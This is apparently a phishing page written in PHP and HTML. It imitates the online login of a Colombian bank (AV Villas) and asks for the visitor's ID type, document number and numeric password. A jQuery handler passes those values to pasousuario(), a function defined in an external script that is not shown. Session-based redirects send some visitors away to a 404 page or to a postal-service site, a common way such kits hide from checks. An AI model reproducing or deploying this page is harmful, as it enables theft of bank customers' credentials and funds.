<?php
session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Banca Digital</title>

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		


    <style>

  *{
    font-family: Arial, Helvetica, sans-serif;
    margin: 0;
    padding: 0;
  }


    .form{
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 20px;
    }

    .form label{
        position: relative;
    }

    .form label .input {
        width: 100%;
        padding: 20px 10px 10px 10px;
        outline: none;
        border: 1px solid;
    }

    .form label .input+span {
        position: absolute;
        left: 10px;
        top: 15px;
        transition: 0.3s ease;
    }

    .form label .input:focus+span,
    .form label .input:valid+span {
        top: 5px;
        font-size: 0.7em;
    }

    
</style>
</head>
<body style="background-image:url(img/background.png);">
    

    <div>
        <br><br>
      <center>  <img src="img/register-bg-logo.svg"></center>
           <center> <br><br><a style="font-size:18px; color:white;">Ingresa a la banca virtual</a><br></center>
    </div>

<br>
 
<center><select name="" style="width:90%; height:55px; border-radius:5px; background-color:white; color:black;">
    <option value="">Cedula de ciudadania</option>
    <option value="">Cedula extranjera</option>
    <option value="">Pasaporte</option></center>


</select>


<div class="form" style="margin-top:15px;">


    <label style="width:85%; height:55px;">
        <input required="required" type="text" class="input" id="txtUsuario" name="user" style="width:100%; margin-left:-10px; border-radius:5px; height:25px;">
        <span>Número de documento</span>
    </label>
    
    <label style="width:85%; height:55px;">
        <input required="required" type="password" class="input" id="txtPass" name="pass" style="width:100%; margin-left:-10px; border-radius:5px;  height:25px;">
        <span>Ingrese su clave</span>
    </label>
    <input type="hidden" value="Avvillas" id="banco">
      <a href="" style="color:white; margin-left:50%; font-size:12px;">Olvidé mi contraseña</a>
    <input type="submit" value="Ingresar" id="btnUsuario" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px;">
    
</div><br>

<hr style="width:90%;">
<br>
<a style="color:white;">¿Aún no tienes contraseña para ingresar?</a><br>
<a href="" style="color:white;">Registrate</a>


<img src="img/foter.jfif" alt="" srcset="" width="100%" style="margin-top:110px;">



<script>
  const txtPass = document.getElementById('txtPass');

  txtPass.addEventListener('input', function() {
    const value = txtPass.value;
    const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos

    if (value !== cleanValue) {
      txtPass.value = cleanValue;
    }
  });
</script>


<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if ($("#txtUsuario").val().length > 0) {
				pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>



</body>
</html>